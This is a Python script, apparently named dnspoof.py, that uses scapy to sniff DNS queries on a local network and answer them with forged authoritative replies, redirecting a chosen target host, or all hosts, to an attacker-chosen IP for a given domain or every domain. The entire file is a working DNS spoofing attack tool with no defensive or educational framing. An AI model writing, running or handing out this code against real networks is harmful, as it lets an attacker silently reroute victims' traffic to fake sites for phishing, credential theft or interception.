import argparse, os, sys, threading
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep

def arg_parser():
	parser = argparse.ArgumentParser()
	parser.add_argument("-d", dest="domain",    help="Website or domain to spoof")
	parser.add_argument("-i", dest="interface", help="Interface to listen on.")
	parser.add_argument("-t", dest="target",    help="Target's IP. If not specified will add all.")
	parser.add_argument("-r", dest="ip",    help="IP to redirect the target to default is all.")
	return parser.parse_args()

def root():
	return (os.geteuid() != 0)

def forge_packet(pkt, ip):
	RR_TTL = 60
	forged_DNSRR = DNSRR(rrname=pkt[DNS].qd.qname, ttl=RR_TTL, rdlen=4, rdata=ip)
	forged_pkt =  IP(src=pkt[IP].dst, dst=pkt[IP].src) /\
	             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /\
	             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=forged_DNSRR)
	return forged_pkt

def packet_handler(pkt, domain, target, ip):
	if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
			if domain is None or domain == pkt[DNS].qd.qname.decode('UTF-8'):
				if target is None or pkt[IP].src == target:
					forged_pkt = forge_packet(pkt, ip)
					print("[+] DNS response sent! Told '%s' that '%s' was at '%s'." % (pkt[IP].src, pkt[DNS].qd.qname.decode('UTF-8'), ip))
					send(forged_pkt, verbose=0)

def dns_spoof(interface, domain, target, ip, stop_event):
	while not stop_event.is_set():
		sniff(iface=interface, prn=lambda pkt: packet_handler(pkt, domain, target, ip), store=0, count=1)

def main():
	args = arg_parser()
	interface = args.interface
	if interface is None:
		interface = scapy.all.conf.iface
	target = args.target
	domain = args.domain
	if domain is not None and domain[-1] != '.':
		domain = domain+'.'
	ip = args.ip
	if ip is None:
		ip = [x[4] for x in scapy.all.conf.route.routes if (x[2] != "0.0.0.0" and x[3] == interface)][0]
	
	if (root()):
		sys.exit("Please, run this script with root : type sudo dnspoof.py.")
	
	stop_event = threading.Event()
	dns=threading.Thread(target=dns_spoof, args=(interface, domain, target, ip, stop_event))
	dns.start()
	
	try:
		while True:
			sleep(0.1)
	except KeyboardInterrupt:
		stop_event.set()

	dns.join()
	print("Bye......")

if __name__ == "__main__":
    main()
